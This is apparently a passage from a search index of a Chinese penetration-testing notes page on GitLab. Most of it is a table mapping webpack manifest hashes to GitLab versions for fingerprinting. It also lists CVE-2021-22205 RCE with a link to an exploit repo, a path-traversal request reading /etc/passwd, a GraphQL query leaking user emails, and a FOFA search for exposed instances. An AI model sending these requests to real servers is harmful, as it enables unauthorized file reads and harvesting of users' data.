'gitlab-ce:14.0.2', 'eebb6ffc30262a5078b3': 'gitlab-ce:11.8.0', 'bda24e7d200a0d34003a': 'gitlab-ce:14.4.1', '3cb651b9ded78ec5e5e8': 'gitlab-ce:13.2.10,13.2.8,13.2.9', 'eef5733506c0541a30f0': 'gitlab-ee:13.6.2', '81aa1e56d2fb8acf7277': 'gitlab-ee:11.1.8', '0bc42faf2609435ffbf4': 'gitlab-ce:13.5.4', '7d43d98529c63f480c16': 'gitlab-ee:10.4.2', '37f3e84421676e355f10': 'gitlab-ee:11.4.6,11.4.7', '2559aed68d9d56d1167c': 'gitlab-ee:10.2.0,10.2.1', '1b8960c60d4896e63703': 'gitlab-ee:10.6.1,10.6.2', '28d61c9e7037a42038fd': 'gitlab-ce:11.3.0', '6063770121a571b50b9c': 'gitlab-ce:10.8.0', '07992a31648e423d2af5': 'gitlab-ee:13.1.0', '3a4197b5cf122f8b18dc': 'gitlab-ce:9.4.6', 'ddd3a0be6b0ef6faafba': 'gitlab-ee:14.2.5', '11ab845be93eaa129e78': 'gitlab-ce:13.12.15', 'ec82707d3f866dccac8b': 'gitlab-ee:12.1.12,12.1.13,12.1.14', '188cfd4384893f602a52': 'gitlab-ce:12.6.6,12.6.7', '9904d8fe3c76ea5f06c2': 'gitlab-ee:9.1.3', '119207c3a8cd87829aed': 'gitlab-ce:11.3.1', '34bf988d7fb3e4cc9f5d': 'gitlab-ce:12.8.10,12.8.8,12.8.9', '938cde10cd954dce9da4': 'gitlab-ee:11.8.6,11.8.7', 'd34961b09e0af5e13343': 'gitlab-ee:14.3.1', '9902887db5eb0f6cd8f3': 'gitlab-ee:12.6.8', 'ec83461c3c19168a84d3': 'gitlab-ee:12.10.13,12.10.14', '4e897e63a1d32f275e11': 'gitlab-ce:13.6.1', 'ea44719dddf278352f86': 'gitlab-ce:11.11.4,11.11.5,11.11.7,11.11.8', '456afae5ce71676911dc': 'gitlab-ce:12.1.17', '67d91be12601337315f7': 'gitlab-ee:9.0.5', '4301f7448383b685c49b': 'gitlab-ee:11.1.6,11.1.7', 'f8534f1afb04c25ed3f4': 'gitlab-ce:11.6.0', '38dfb5756945cea3dd27': 'gitlab-ce:11.9.10,11.9.11,11.9.12,11.9.6,11.9.7,11.9.8,11.9.9', 'ef0c3cfbbd3e3a8a2534': 'gitlab-ce:13.8.2,13.8.3,13.8.4', 'c9bf991cf2beb5e62667': 'gitlab-ce:13.1.0', 'bccc7be0f9c03b70a5e6': 'gitlab-ee:13.12.0', '7d8865fbde7c8d493e84': 'gitlab-ee:13.5.0', '633c38f22c8f88b9fb4a': 'gitlab-ce:10.0.3', '9942f645172a41c8335e': 'gitlab-ce:9.0.6', '3a2b35098114d9119d97': 'gitlab-ee:10.6.3', '430458ad60fc069ac5d1': 'gitlab-ce:12.8.5,12.8.6,12.8.7', 'c89dcfd86eaf9551f4a3': 'gitlab-ce:11.5.0', '847fa0453327f8669000': 'gitlab-ee:13.4.0', '21d4dda00a24a446bf7f': 'gitlab-ee:9.0.6', '32db020b9d43b8a50037': 'gitlab-ce:13.6.3,13.6.4,13.6.5', '2775dff9deb7b37bdfa6': 'gitlab-ee:11.3.11,11.3.12,11.3.13,11.3.14', '314ae155c8f6f953adb6': 'gitlab-ee:10.0.2', 'c20a1cbee3c383bf9f14': 'gitlab-ee:12.8.5,12.8.6,12.8.7', 'd558d95b4804ac8fbf40': 'gitlab-ee:10.2.6,10.2.7,10.2.8', '704928cb41c2f94b9b1d': 'gitlab-ce:13.12.10,13.12.11,13.12.12,13.12.9', '30b3667b4d41d8ce44a3': 'gitlab-ce:11.1.4', 'e267a4db225588f8c11e': 'gitlab-ce:9.0.1,9.0.2', 'cc42e9b802eeaf94293c': 'gitlab-ee:13.1.4,13.1.5', '9c23f762b77db429339a': 'gitlab-ce:11.11.0,11.11.1,11.11.2', '1dae310d8bfeeebafe86': 'gitlab-ce:12.3.6', 'c5eb5be9bee6be3c4538': 'gitlab-ce:9.4.5', '8d2b0f1ff095accfc367': 'gitlab-ce:14.2.5', '07cc1fe08ad7d1332e64': 'gitlab-ce:12.6.0,12.6.1,12.6.2,12.6.3,12.6.4', 'ff4684701a85b37f55d8': 'gitlab-ee:13.12.6,13.12.7,13.12.8', '74f24f2f5b4497a29ea4': 'gitlab-ee:11.1.4', 'd49d67df80246079a30c': 'gitlab-ce:14.4.0', 'e84d29ce2b8b7cfcef2e': 'gitlab-ce:10.0.5,10.0.6', 'e823053a3d100e86d493': 'gitlab-ee:13.2.0', '0218bf32825db6f0dd65': 'gitlab-ce:13.0.1', '58c006356a35c0a6e32d': 'gitlab-ee:11.5.10,11.5.11', '272581befe0e90303fef': 'gitlab-ee:8.17.2', '8d7e1919dabad9366801': 'gitlab-ee:13.12.15', 'c7d8acb11d3c82f6e711': 'gitlab-ee:12.4.0,12.4.1', '6a10102fa6ffbd556c1f': 'gitlab-ee:13.5.3', 'fd874117abfe342520d1': 'gitlab-ee:9.3.0', \u6e17\u900f gitlab\u672a\u6388\u6743RCE\uff08CVE-2021-22205\uff09 \u5f71\u54cd\u7248\u672c 11.9 <= Gitlab CE/EE < 13.8.813.9 <= Gitlab CE/EE < 13.9.613.10 <= Gitlab CE/EE < 13.10.3 https://github.com/Al1ex/CVE-2021-22205 \u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e \u53ef\u80fd\u9700\u8981\u767b\u5f55 GET /group1/group2/group3/group4/group5/group6/group7/group8/group9/project9/uploads/4e02c376ac758e162ec674399741e38d//..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd \u672a\u6388\u6743\u6d4f\u89c8\u9879\u76ee /explore/projects \u90ae\u4ef6\u4fe1\u606f\u6cc4\u9732 GitLab 13.4 - 13.6.2 POST /api/graphql HTTP/1.1 Host: Content-Length: 212 Content-Type: application/json {\"query\":\"{\\nusers {\\nedges {\\n node {\\n username\\n email\\n avatarUrl\\n status {\\n emoji\\n message\\n messageHtml\\n }\\n }\\n }\\n }\\n }\",\"variables\":null,\"operationName\":null}","title":"gitlab"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/gitlab/gitlab/#gitlab","text":"","title":"gitlab"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/gitlab/gitlab/#_1","text":"\u4fe1\u606f\u63a2\u6d4b \u7248\u672c-help\u68c0\u6d4b \u7248\u672c-json\u6587\u4ef6\u68c0\u6d4b \u6e17\u900f gitlab\u672a\u6388\u6743RCE\uff08CVE-2021-22205\uff09 \u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e \u672a\u6388\u6743\u6d4f\u89c8\u9879\u76ee \u90ae\u4ef6\u4fe1\u606f\u6cc4\u9732","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/gitlab/gitlab/#_2","text":"fofa https://fofa.info/result?qbase64=YXBwPSJHaXRMYWIi\u200b","title":"\u4fe1\u606f\u63a2\u6d4b"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/gitlab/gitlab/#-help","text":"\u57fa\u672c\u4e0d\u9002\u7528\u4e86\uff0chelp\u73b0\u5728\u5f88\u5c11\u663e\u793a\u7248\u672c /help","title":"\u7248\u672c-help\u68c0\u6d4b"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/gitlab/gitlab/#-json","text":"GET /assets/webpack/manifest.json \u627e\u5230\u8fd9\u4e2ahash \u7136\u540e\u8fdb\u884c\u6bd4\u5bf9 'cf9dda0685218aacd158': 'gitlab-ce:11.7.10,11.7.11,11.7.12', '6b1a340cc698f3d774e3': 'gitlab-ce:11.3.11,11.3.12,11.3.13,11.3.14', 'c28d3239bbda98edab5d': 'gitlab-ee:11.6.9', 'fd45e68f8ec7fbcbdf7f': 'gitlab-ee:9.3.2', '6bbcdc4e4a890abe3ab6': 'gitlab-ce:11.9.0,11.9.1', '66be8eb8d0247972158a': 'gitlab-ee:13.12.1', '5e0deddaf1aa02e08f6a': 'gitlab-ee:12.9.4,12.9.5,12.9.7', '32d837da3ba6c30dbffa': 'gitlab-ce:10.3.6', '901231cf8f98cf4d667d': 'gitlab-ee:12.0.2,12.0.3,12.0.4,12.0.6', 'c3e77be338d2c3820aa3': 'gitlab-ce:9.2.2', '900faeefc76b9c39e177': 'gitlab-ee:14.3.0', '7152f9200692c23439c5': 'gitlab-ce:13.9.1', '41256ddae2db143059f2': 'gitlab-ce:13.9.7', '7a2c2e92a6e9321d72c9': 'gitlab-ee:10.3.1,10.3.2,10.3.3', '757ea54bb7c30371af8e': 'gitlab-ee:13.7.1,13.7.2', '0589199a189a8263ea5c': 'gitlab-ce:11.8.10,11.8.8,11.8.9', '05454825fb65e5ed0564': 'gitlab-ee:11.3.3,11.3.4', '1a8f05366713a36b827e': 'gitlab-ce:13.9.0', 'ef8dc9055fbadcbf7559': 'gitlab-ce:9.3.11', 'befdb42a52a4c25ec60f': 'gitlab-ee:13.6.1', 'd5f2790d0c39d871ee37': 'gitlab-ce:12.10.7,12.10.8,12.10.9', 'd00382251ba87eeef9da': 'gitlab-ce:11.3.8,11.3.9', 'e98edb555f7ea1690d21': 'gitlab-ee:10.2.5', '224c9f103ccf8bf46799': 'gitlab-ce:12.5.10,12.5.9', '386d7d148743a68c788f': 'gitlab-ee:9.1.0,9.1.1,9.1.2', '09aa4374ab4df72e152c': 'gitlab-ce:12.6.8', '8043442ac0d544944bdc': 'gitlab-ce:13.12.6,13.12.7,13.12.8', '86d8b00939d5dfd6750b': 'gitlab-ce:10.5.7', '3229170f0ab163995592': 'gitlab-ee:12.4.4,12.4.5,12.4.6,12.4.7,12.4.8', '8118d9f5f74864693cd0': 'gitlab-ee:13.6.0', '185311b0772bb15a4124': 'gitlab-ce:13.11.3,13.11.4', '7efdeb80cc66c0f1454e': 'gitlab-ee:10.1.5', '5432ddc701c4ecb18cdd': 'gitlab-ee:13.5.5,13.5.6,13.5.7', '6c4c0e3cad12d9f2741b': 'gitlab-ce:13.4.0,13.4.1,13.4.2,13.4.3', '688ae2009bbea7660b29': 'gitlab-ee:12.3.0,12.3.1', 'ff718f27cbfe595d0c5a': 'gitlab-ee:13.3.9', '1f58a7fd842a95f7246e': 'gitlab-ee:11.2.0,11.2.1', '0e6ebb20f1f78e68c313': 'gitlab-ee:14.1.0,14.1.1', 'bcba1a30a136e44d7dba': 'gitlab-ee:13.4.4', '81cd9035005c0dbac690': 'gitlab-ee:9.0.1,9.0.2', '6677d59e72866131dd80': 'gitlab-ee:14.4.1', 'f84a5781c1f2e33460dd': 'gitlab-ee:8.17.0', 'c86a070122da587b8b1d': 'gitlab-ce:9.5.3', '4728caeeff834b2c0c40': 'gitlab-ce:11.4.10,11.4.11,11.4.12,11.4.8,11.4.9', '24ea291e777ae6c5c2e1': 'gitlab-ce:11.0.3,11.0.4', '03718fb3904d21960ca5': 'gitlab-ce:12.10.13,12.10.14', 'b8fa9c1f30ecbef1d125': 'gitlab-ce:13.7.8,13.7.9', 'ace501b6fc6ab4254916': 'gitlab-ce:9.0.10,9.0.11,9.0.12,9.0.13,9.0.7,9.0.9', '528cd970c76d9969887c': 'gitlab-ce:12.5.1,12.5.2', 'f4f956ad11599396a680': 'gitlab-ce:11.9.4', 'cde2f5973aad940f794c': 'gitlab-ee:14.4.0', 'febbdc5097b2bcb3f35a': 'gitlab-ee:13.8.5,13.8.6,13.8.7,13.8.8', '359b54bfd45aac35d8b7': 'gitlab-ce:12.9.4,12.9.5,12.9.7', 'a72463e762bf45334c19': 'gitlab-ce:10.4.4,10.4.5,10.4.6', 'e37d0117517fb9a3f6e1': 'gitlab-ce:13.3.2,13.3.3', 'fd79ab56d7d298db3d67': 'gitlab-ee:9.5.10,9.5.9', 'ee193a55c67377955a51': 'gitlab-ce:13.12.0,13.12.1', '79e5a070754dcefaf198': 'gitlab-ee:13.3.5', '5626b32f6eb1d2b31bc9': 'gitlab-ee:11.9.0', '433d31ecbc8c2f19286e': 'gitlab-ee:11.1.2', 'be0e341aa6473f2581a3': 'gitlab-ce:12.3.0,12.3.1', 'c106c9e4c60efb8a36a6': 'gitlab-ee:10.2.3', '8e3d3bfb37388b523b42': 'gitlab-ce:12.10.10,12.10.11,12.10.12', '8d91d38916cfadff9fdd': 'gitlab-ee:13.4.7', '7af107b33916d608fb10': 'gitlab-ce:9.0.3,9.0.4', 'd074198337d797055418': 'gitlab-ee:13.11.5', '0f89294c899fd9acf9a0': 'gitlab-ce:9.1.3', 'e700d0b451fad61bc2ce': 'gitlab-ce:13.6.2', 'e540ee263bc38a8adea1': 'gitlab-ee:11.6.1', '46c7dfbe962d7bbb7d4b': 'gitlab-ee:12.6.6,12.6.7', '4894d4f1fe0f2f2990a1': 'gitlab-ce:14.0.10,14.0.11,14.0.7,14.0.8,14.0.9', '885f1a8c1499d69dbe12': 'gitlab-ce:10.5.4,10.5.5,10.5.6', '97068fa7d49791d762aa': 'gitlab-ce:8.17.4,8.17.5', 'aec631615e5dc8f2058f': 'gitlab-ee:11.3.10', 'daf226fb1a889e2935bb': 'gitlab-ce:11.2.0,11.2.1', '6e88a01575fdbb325271': 'gitlab-ee:13.5.1', '5f1a0adb1e27d57e6932': 'gitlab-ee:9.3.3', '95cdb3ab46d12dd1c443': 'gitlab-ee:10.7.5,10.7.6,10.7.7', '7b04a345628e37db69fa': 'gitlab-ce:10.7.2', 'f01f0e1e0514d0a61895': 'gitlab-ee:12.9.1', '7f723378064d4b1d0e9e': 'gitlab-ee:11.6.10,11.6.11', '1686df51990654bb1054': 'gitlab-ce:10.6.0', 'd4edaa9d0fb17ed72506': 'gitlab-ee:13.11.6,13.11.7', '3b90f4e32d4f5b2051b9': 'gitlab-ce:13.11.6,13.11.7', 'f1feb0489f6d4056d72d': 'gitlab-ee:11.4.3,11.4.4', '8d9d6dd550fe2b65402c': 'gitlab-ee:10.8.7', '0b0bbbbea3aad08a16b3': 'gitlab-ce:13.5.0', '1063668f6a6c737c8b83': 'gitlab-ee:11.3.8,11.3.9', 'fcd10f5a8e0098ea15ed': 'gitlab-ce:10.2.0,10.2.1', '43a0bfa9d67baf9c7530': 'gitlab-ce:11.6.2,11.6.3,11.6.4', '286de78d78d5e620094f': 'gitlab-ee:12.2.4,12.2.5', 'd8726e1320b92b0f2a6d': 'gitlab-ce:10.1.1,10.1.2', 'c8017d62e3bdd1de8ba1': 'gitlab-ee:12.4.2,12.4.3', 'b34d36fde013c6800938': 'gitlab-ee:12.5.3,12.5.4,12.5.5,12.5.6,12.5.7', 'bc4277618d88119d7f63': 'gitlab-ce:12.9.0', 'b3ddefcac9e1fd0ce088': 'gitlab-ee:10.0.7', '7e8a2ad730063d55c763': 'gitlab-ee:10.2.2', '3b1c36c89eca83a04cda': 'gitlab-ce:10.2.6,10.2.7,10.2.8', '6f6094fd1f77ec38c04e': 'gitlab-ee:13.1.1', 'e787f4c0a544820285f9': 'gitlab-ce:10.6.1,10.6.2', '8b6b0f66e5a55f41c2db': 'gitlab-ee:11.11.4,11.11.5,11.11.7,11.11.8', 'bd478f9681c28a19d424': 'gitlab-ce:10.4.0', '0bf18d06009d8c26c8eb': 'gitlab-ee:12.7.8,12.7.9', 'c327f68685b74583845d': 'gitlab-ce:13.5.1', '1db97d739bc18192e3dd': 'gitlab-ee:11.3.1', 'dbcae02d83f78d6a2dc7': 'gitlab-ee:13.6.6,13.6.7', 'd4b22e27bcff3e9f8297': 'gitlab-ee:10.6.5', 'a0eea1a7adb510d4528d': 'gitlab-ce:9.2.0', '76a669fbdba0dcaa0570': 'gitlab-ee:11.7.0', '45b860ac2482f3a8f9fc': 'gitlab-ce:10.5.0,10.5.1', '61085e1c4a43e155ed0b': 'gitlab-ee:10.6.6', '3c09e82ba9c703dca63f': 'gitlab-ee:9.2.2', '2e730199dabd73a9fd42': 'gitlab-ee:12.1.4,12.1.6', '8ee67c4aab5b94bf8a1d': 'gitlab-ee:14.0.5', 'f965d9d92177d6bc4799': 'gitlab-ce:13.0.0', '3888ff9e576fb9b44f1a': 'gitlab-ee:13.10.5', '8a07de65a98e22620346': 'gitlab-ee:11.2.7,11.2.8', '04eb4b96ba73c4add5fb': 'gitlab-ce:13.7.3,13.7.4', '55d3ae286e625a2dd2dc': 'gitlab-ee:11.3.0', '5f9673e4f7b28c674bb5': 'gitlab-ce:13.8.0,13.8.1', 'd3b5a874ddeb9e8c4909': 'gitlab-ee:13.2.1', '0ee89562957c3b844752': 'gitlab-ce:13.3.4', 'b8886235228a03aba343': 'gitlab-ce:13.3.5,13.3.6,13.3.7,13.3.8', '1f26e2bcf01f916359be': 'gitlab-ee:9.5.1,9.5.2', 'd677104c4442b6dc08ff': 'gitlab-ee:10.0.3', '4ccc09c89530820dfb29': 'gitlab-ce:10.0.7', 'd6040dbf29b9aec13c52': 'gitlab-ce:12.9.10,12.9.8,12.9.9', '60bde3c749532d5d6244': 'gitlab-ce:13.1.10,13.1.11', '0f57e0adf896561cb8a5': 'gitlab-ee:10.0.4', '18be6a306c740d6c87ce': 'gitlab-ee:10.3.0', 'f20954fae6f4eabf42c9': 'gitlab-ce:11.0.6', '7b490ba06ee0ed11f4cf': 'gitlab-ce:9.4.7', 'f5ca76b6507323647c9a': 'gitlab-ee:10.7.1', 'a7071d3a3ab911b28444': 'gitlab-ee:9.4.5', '1e4b1a7e2c92a2d7ccd8': 'gitlab-ce:9.3.3,9.3.4', 'c9795c27e34bcb0ace00': 'gitlab-ee:11.11.0', '329053c1c5f9599ed76a': 'gitlab-ee:11.10.5', '57be36db00242d9b6e00': 'gitlab-ce:11.7.5', '6c94ffdb6636aa364e0a': 'gitlab-ee:11.4.5', '3fd9f68cd2dadcff10e7': 'gitlab-ee:12.10.7,12.10.8,12.10.9', '2298070445002138e375': 'gitlab-ee:12.10.10,12.10.11,12.10.12', '0e3746858bb25a05a572': 'gitlab-ce:11.7.3', 'da92db7adc23fa49e54b': 'gitlab-ce:12.2.3', '6296cf4ec72df3ee3910': 'gitlab-ee:11.7.3', 'b9edfdcd25aca1714a0c': 'gitlab-ce:12.0.0,12.0.1,12.0.2,12.0.3,12.0.4,12.0.6', '8581c734d9db5fba7c12': 'gitlab-ee:12.8.10,12.8.8,12.8.9', '96567f0814bcf6bdc6e7': 'gitlab-ee:11.6.5', '713c5579a7ab27935370': 'gitlab-ee:11.7.4', '69496dbc5da2e2da2e38': 'gitlab-ce:11.4.0', '8c4b9021880e82534956': 'gitlab-ee:9.4.1', '770898c00ccf25dade07': 'gitlab-ce:12.2.1', '611cbe4b65ee48d4477b': 'gitlab-ee:13.5.2', '4f00d34b742f6ca6b4c9': 'gitlab-ce:13.8.5,13.8.6,13.8.7,13.8.8', '9ae7857784103a928459': 'gitlab-ee:9.0.3,9.0.4', 'dd27861b27acdf7d6d5a': 'gitlab-ce:10.1.5', 'cb5ad49a7b3ead484f78': 'gitlab-ce:11.6.1', '745a84f132170c95b546': 'gitlab-ce:13.1.1', 'c2b8972e6e2a17fc96b7': 'gitlab-ee:14.1.2', '46a5b7283d15b5d027b1': 'gitlab-ce:14.1.7', '06eaab4d1739bff64ef8': 'gitlab-ce:12.7.7', '78225279c3ce10b49fcd': 'gitlab-ee:12.7.7', 'b6e167ed0a5918b43191': 'gitlab-ce:11.5.6,11.5.7', 'adfe78d0aefbab620433': 'gitlab-ee:12.2.6,12.2.7,12.2.8', '38079830b091db499557': 'gitlab-ce:10.1.0', '2ba47845e121cd4d3a3d': 'gitlab-ee:12.8.1', 'd6d067330798d959ae88': 'gitlab-ce:9.5.1,9.5.2', 'd51c2c492dc12f1b3166': 'gitlab-ee:12.10.0', '9bea2f7be47dddf76336': 'gitlab-ce:11.2.2,11.2.3', 'fb4620281ae4e0256a28': 'gitlab-ee:11.2.2,11.2.3', '14c541adf6cecee03dfc': 'gitlab-ce:9.3.10,9.3.6,9.3.7,9.3.8,9.3.9', 'd8a3fb15d9634390587b': 'gitlab-ce:10.0.0,10.0.1', 'a398a7c81b03d11b77cd': 'gitlab-ce:9.4.2,9.4.3,9.4.4', 'b8516bf1fc26cafe7094': 'gitlab-ce:13.10.4', '1e9b3359158067c96acf': 'gitlab-ee:11.9.6,11.9.7,11.9.8,11.9.9', '9159680a5fe09531a670': 'gitlab-ee:9.5.8', '0cf4960a989f1f3f7cd5': 'gitlab-ce:9.3.2', '4f17305e2f7c40cbe427': 'gitlab-ce:10.1.6,10.1.7', '1ac488145e09bf290e9c': 'gitlab-ee:13.7.3,13.7.4', 'ee201aa2048442f0f571': 'gitlab-ee:10.4.1', '6a58a819d89475283be3': 'gitlab-ee:9.5.4', 'b5a432700edaacaed532': 'gitlab-ee:11.0.5', '67d7515ea6b7b81c810b': 'gitlab-ce:12.4.0,12.4.1', '1e7b7a19e7fc6a402fde': 'gitlab-ce:10.1.4', 'f2a7a40810eda3543fc1': 'gitlab-ce:8.17.3', '2fee7cb6c82e73909c1d': 'gitlab-ee:10.3.6', '82f0ad367971194ea7ca': 'gitlab-ee:12.5.0', 'fe0f2ce66b78d23cf71c': 'gitlab-ee:8.17.3', '2d7dad0841b9c8ac2f3c': 'gitlab-ce:11.10.4,11.10.5', '2a0d7614b0081b46aa48': 'gitlab-ce:12.1.0,12.1.1,12.1.2', '2fdc0a56d6a5e2d7e26c': 'gitlab-ce:12.2.12,12.2.9', 'c5c55d778023c5386e39': 'gitlab-ce:11.1.6', 'a4fa1660d82c72de65fb': 'gitlab-ee:11.2.4,11.2.5', '941b6c745d8eb033c900': 'gitlab-ce:11.1.0,11.1.1', '1473b342b66217f47bdf': 'gitlab-ee:13.2.3,13.2.4,13.2.5,13.2.6,13.2.7', '2691ef2c40d268c6064c': 'gitlab-ee:9.4.0', 'cbf23b9150dbe943006d': 'gitlab-ee:13.9.0', '71270dfc259b212bd43f': 'gitlab-ee:11.8.1', '804f4c40c1a04bd98041': 'gitlab-ce:10.4.1', '2e05391d886be053423b': 'gitlab-ee:9.1.10,9.1.4,9.1.5,9.1.6,9.1.7,9.1.8,9.1.9', '5aa6cbe10128e1752346': 'gitlab-ee:11.7.5', 'cb6c441a23a63bd4df8d': 'gitlab-ce:11.4.13,11.4.14', 'da7c281cae020b982b0e': 'gitlab-ee:12.10.1,12.10.2', '50b18acefcff7ea3f88b': 'gitlab-ce:13.4.6', '357494e60d0fa95a049d': 'gitlab-ce:11.4.5', 'b5958f38de8bb770a427': 'gitlab-ce:13.11.0', '1bc6ff6ddbae9c73db6c': 'gitlab-ce:12.8.2', '6dd70427ca11f0d187b7': 'gitlab-ee:11.3.5,11.3.6', '27ee7b6d923fff92df79': 'gitlab-ce:11.6.5', '639f474c96dc01595843': 'gitlab-ce:13.0.10,13.0.12,13.0.8,13.0.9', '02f3aa18525a0a00b156': 'gitlab-ee:13.0.10,13.0.8,13.0.9', '3404b07279d6b61fc258': 'gitlab-ce:8.17.2', '12920a0cf6d30b69ad25': 'gitlab-ee:11.0.2', 'b49a43faa0ccc0abb9d7': 'gitlab-ce:13.10.0,13.10.1', '780f930d55a0bc2d63e6': 'gitlab-ee:13.8.2,13.8.3,13.8.4', '2e2fb73c797ef01cc4e8': 'gitlab-ce:12.8.1', 'f3251b97b88a3d5af409': 'gitlab-ce:10.4.7', 'acbf99bd66c37c0d469a': 'gitlab-ce:13.5.3', 'c27c6c5f75b15ff20b3a': 'gitlab-ee:13.3.0,13.3.1', '910ff53c2adb9645f033': 'gitlab-ee:12.5.1,12.5.2', 'a5d87ba54ff2241ad449': 'gitlab-ee:11.11.3', '4f63918d59feb65252f5': 'gitlab-ee:9.3.5', '670e4558a58a83bc79c3': 'gitlab-ce:11.7.4', '9fe06a5a29af49022519': 'gitlab-ce:12.10.0', '1c7b8def2bcdb43a14e8': 'gitlab-ee:10.5.8', '5ad20937684505080145': 'gitlab-ce:13.4.7', '88f25d9ffb77350f7bb8': 'gitlab-ee:13.10.0,13.10.1', '1ae3f4558570b45f0b46': 'gitlab-ee:11.10.1,11.10.2,11.10.3', 'ae144461abbf725b8ad3': 'gitlab-ee:11.4.10,11.4.11,11.4.12,11.4.8,11.4.9', 'bdfad00c5fa325f3a151': 'gitlab-ee:8.17.1', '44cafa18be1d9fd89d85': 'gitlab-ce:10.6.3', 'b74bc187c1171079f809': 'gitlab-ee:11.1.0,11.1.1', '0ccb1fee73207ef4f88b': 'gitlab-ce:9.5.5', '9e2d1921c3c6410258ba': 'gitlab-ee:13.12.2,13.12.3,13.12.4,13.12.5', '9cce48100a706a982524': 'gitlab-ce:13.6.0', '80adec399f32b3452eeb': 'gitlab-ce:10.8.7', '73554f53a666c6cbbcc9': 'gitlab-ee:10.7.3', '64245f60eedbf42f4b80': 'gitlab-ee:12.1.0,12.1.1,12.1.2', '8fc18db6f68340703dad': 'gitlab-ee:14.2.6', 'f7201fe2a464a34441a9': 'gitlab-ee:14.2.1,14.2.2', '9b78ce3d08b2ff5bdf46': 'gitlab-ce:14.1.0,14.1.1', '72a44972e01ad19285ee': 'gitlab-ce:11.10.6', '2454119e495efd7f45e8': 'gitlab-ce:10.0.4', 'f324c0cbb902a95bced3': 'gitlab-ee:12.2.3', '8a7193fe241497693f0e': 'gitlab-ee:11.6.8', '4cbaa7d70c2ab2f56fdd': 'gitlab-ee:9.0.10,9.0.11,9.0.12,9.0.13,9.0.7,9.0.9', '4244014a286fb646ff87': 'gitlab-ce:10.3.0,10.3.1,10.3.2,10.3.3', '53e80bf2b623c018416f': 'gitlab-ce:9.3.5', '0e435ad4a40e195461d2': 'gitlab-ee:12.7.4,12.7.5,12.7.6', '9c897e4944f560281319': 'gitlab-ee:14.0.3,14.0.4', '509faa54f01663e1a45d': 'gitlab-ee:10.5.2,10.5.3', '29ef5f37b56444925955': 'gitlab-ce:11.1.7,11.1.8', '553644b367be99a65e30': 'gitlab-ee:10.4.0', '1337f73f81b1f8c6446d': 'gitlab-ee:11.0.6', 'b28c4eb12bd74962f8c3': 'gitlab-ee:11.8.2,11.8.3', '0b2bc0565d38348040d9': 'gitlab-ce:14.3.3', '033d2169000ad78f17ac': 'gitlab-ce:11.0.2', 'f679875473d4039d1da5': 'gitlab-ee:13.3.4', '0a849c30886c1a0ce2e2': 'gitlab-ce:9.1.10,9.1.4,9.1.5,9.1.6,9.1.7,9.1.8,9.1.9', '3133bc82ee3218615825': 'gitlab-ee:11.9.1', '2360793a2467d0ce2d1f': 'gitlab-ee:13.4.5', '0e2609bc9105bb36fcc2': 'gitlab-ce:10.3.7,10.3.8,10.3.9', 'a64579e944da0c8a41ec': 'gitlab-ee:12.10.3,12.10.5,12.10.6', 'e305e72c24f3a7cd25a4': 'gitlab-ee:10.3.7,10.3.8,10.3.9', '34205dd7c909e69bd49b': 'gitlab-ee:12.1.3', '610336a669ddaebc3ddc': 'gitlab-ce:13.0.3,13.0.4,13.0.5,13.0.6,13.0.7', 'dcb279f89ca98d1d167b': 'gitlab-ee:9.3.4', 'af5ca69ff066bbc8c736': 'gitlab-ee:13.9.2,13.9.3,13.9.4,13.9.5,13.9.6', '29a7ce5ea8e6db4bff13': 'gitlab-ce:12.10.1,12.10.2', '972b2e02a438aff45f12': 'gitlab-ee:10.4.7', '1c76e5ed7c715ef9d10b': 'gitlab-ee:10.7.4', '106481def6f2098f78a1': 'gitlab-ee:10.0.5,10.0.6', 'a381c27b42a0e0be325d': 'gitlab-ee:13.6.3,13.6.4,13.6.5', '2a8248652e9591a14a4a': 'gitlab-ce:12.8.0', '5f3de1268cb4f3228d81': 'gitlab-ce:10.5.8', '6ac68a50a59485a4bd47': 'gitlab-ce:12.2.4,12.2.5', 'b965c847cc09dd86f24d': 'gitlab-ee:11.8.0', 'cd62a8c290ab55fd1bd6': 'gitlab-ee:12.1.17', '3f886fd62e2871621c51': 'gitlab-ce:12.5.3,12.5.4,12.5.5,12.5.6,12.5.7', '2976ae0b75d1924b7097': 'gitlab-ee:9.3.10,9.3.6,9.3.7,9.3.8,9.3.9', '84cac3a227cc9bb8d352': 'gitlab-ee:12.2.0', '2ecacdae558d2d2c280e': 'gitlab-ee:12.8.0', '287f4e77f36c8bfefb20': 'gitlab-ce:13.1.7,13.1.8,13.1.9', '1b844cd7373bbe7daaae': 'gitlab-ee:12.5.10,12.5.9', '0b20fcae7619f933befa': 'gitlab-ce:13.7.5', 'ae0dea2e6a4421316992': 'gitlab-ce:8.17.6,8.17.7,8.17.8', '0a73a93554807761e4cc': 'gitlab-ce:9.3.1', 'b348a9a8c3c1d8c631d2': 'gitlab-ee:11.9.4', 'a4363e74b255a4977bd7': 'gitlab-ee:8.17.4,8.17.5', 'b4a2f58144d288bdfa1c': 'gitlab-ce:10.5.2,10.5.3', '3bbf5e9a221bce6d4111': 'gitlab-ee:11.7.6,11.7.7', '527e4c54eb834d56fde0': 'gitlab-ee:11.5.6,11.5.7', '7c70a9b72d32292039fd': 'gitlab-ee:13.8.1', '08869d0956bdbfa38e58': 